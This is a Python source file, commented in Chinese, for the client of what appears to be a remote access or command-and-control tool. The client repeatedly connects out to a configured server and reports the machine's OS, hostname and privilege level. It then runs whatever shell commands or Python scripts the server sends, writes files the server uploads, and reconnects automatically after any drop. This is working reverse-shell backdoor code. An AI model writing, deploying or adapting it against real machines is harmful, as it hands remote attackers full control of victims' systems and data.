import inspect
import json
import os
import platform
import socket
import sys
import time

from client.command import Command
from client.config import SERVER_ADDR
from client.server import Server
from common.util import parse, logger

if os.name == 'nt':
    from client.win32util import get_integrity_level


class Client:
    def __init__(self, address):
        # 服务端地址
        self.address = address
        # 服务端套接字
        self.server = Server()

    def connect(self):
        """ 连接服务端 """
        logger.info('Connecting to {}'.format(self.address))
        # 连接失败等待5秒后重新连接
        while not self.server.connect(self.address):
            time.sleep(5)
        # 发送客户端信息
        info = {
            # 操作系统
            'os': platform.platform(),
            # 主机名
            'hostname': socket.gethostname(),
            # 进程权限
            'integrity': get_integrity_level() if os.name == 'nt' else 'N/A'
        }
        self.server.send_result(1, json.dumps(info))
        logger.info('Connected')

    def wait_for_cmd(self):
        """ 等待命令 """
        while True:
            try:
                # 接收命令
                try:
                    # 接收消息头
                    head = self.server.recv_head()
                    # 消息类型
                    type = head['type']
                    # 保存文件
                    if type == 'file':
                        filename = head['filename']
                        with open(filename, 'ab') as f:
                            f.truncate(0)
                            self.server.recv_body(head, f=f)
                            result = 1, '\nFile uploaded to: {}'.format(os.path.abspath(filename))
                    else:
                        body = self.server.recv_body(head)
                        # 执行命令
                        if type == 'command':
                            result = self.exec_cmd(body)
                        # 执行python脚本
                        elif type == 'script':
                            result = Command.pyexec(body, json.loads(head['args']))
                        else:
                            result = None
                    # 发送结果
                    if result:
                        self.server.send_result(*result)
                except Exception as e:
                    self.server.send_result(0, str(e))
                # 发送当前工作路径
                self.server.send_result(1, os.getcwd())
            except SystemExit:
                logger.info('Server closed this connection')
                break
            # 连接断开
            except socket.error:
                logger.error('Connection closed')
                # 关闭套接字
                self.server.close()
                # 重新创建套接字
                self.server = Server()
                # 重新连接
                self.connect()

    def exec_cmd(self, command):
        """ 执行命令 """
        cmd = Command()
        # 关闭连接
        if command == 'kill':
            self.server.close()
            sys.exit(0)
        # 将收到的命令拆分成命令名和参数
        name, arg = parse(command)
        if hasattr(cmd, name):
            # 通过命令名获取函数
            func = getattr(cmd, name)
            # 获取函数的参数
            args = inspect.getfullargspec(func).args
            # 获取函数的参数个数
            argc = len(args)
            # 如果函数没有参数
            if not argc:
                # 调用函数并发送命令执行结果
                return func()
            # 如果函数需要传入服务端套接字
            elif 'server' in args:
                # 函数只需要传入服务端套接字
                if argc == 1:
                    func(self.server)
                # 函数需要传入服务端套接字和命令参数
                else:
                    func(self.server, arg)
            # 如果函数有参数但不是服务端套接字
            else:
                # 将命令参数传给该函数，调用函数并发送命令执行结果
                return func(arg)
        else:
            # 执行shell命令
            return cmd.shell(command)


if __name__ == '__main__':
    client = Client(SERVER_ADDR)
    try:
        client.connect()
        client.wait_for_cmd()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(e)
